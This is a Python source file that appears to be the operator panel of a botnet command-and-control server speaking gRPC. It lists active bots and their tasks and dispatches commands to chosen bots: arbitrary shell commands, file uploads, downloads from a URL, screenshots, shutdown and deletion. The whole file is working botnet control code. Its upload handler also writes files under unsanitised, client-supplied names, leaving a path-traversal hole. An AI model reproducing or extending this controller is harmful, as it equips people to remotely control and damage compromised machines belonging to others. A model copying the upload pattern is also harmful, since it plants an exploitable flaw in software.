from protos.botnet_pb2 import *
from protos.botnet_pb2_grpc import *

def get_tasks(client):
    bots = []
    tasks = []
    complete = []
    for b in client.GetActiveBots(Empty()):
        bots.append(b)
    for task in client.GetTasks(Empty()):
        tasks.append(task)
    for c in client.GetComplete(Empty()):
        complete.append(c)
    total = len(bots)
    t = len(tasks)
    c = len(complete)
    return total, t, c, tasks, complete

def get_task(client, id):
    return client.GetTask(Task(task_id=id))

def show_task_menu(client):
    bots = []
    for b in client.GetActiveBots(Empty()):
        bots.append(b)
    return bots, len(bots)

def send_tasks(client, request):
    array = []
    bots_array = request.form.getlist("bot")
    tarea = request.form["selection"]
    if tarea == "CMD":
        comando = request.form["cmd"]
        for i in bots_array:
            task = Task(task_id="", bot_id=i, type=tarea, status="WAITING", date_start="", date_finish="", command=comando)
            array.append(task)
    elif tarea == "UPLOAD":
        file = request.files["fichero"]
        name = file.filename
        datafile = file.read()
        f = open(f"./server/files/upload/{name}", "wb")
        f.write(datafile)
        f.close()
        for i in bots_array:
            task = Task(task_id="", bot_id=i, type=tarea, status="WAITING", date_start="", date_finish="", file=f"./server/files/upload/{name}")
            array.append(task)
    elif tarea == "DOWNLOAD":
        url_file = request.form["url_fichero"]
        for i in bots_array:
            task = Task(task_id="", bot_id=i, type=tarea, status="WAITING", date_start="", date_finish="", file=url_file)
            array.append(task)
    elif tarea == "SCREENSHOT" or tarea == "SHUTDOWN" or tarea == "DELETE":
        for i in bots_array:
            task = Task(task_id="", bot_id=i, type=tarea, status="WAITING", date_start="", date_finish="")
            array.append(task)
    iterator = iter(array)
    client.AddTask(iterator)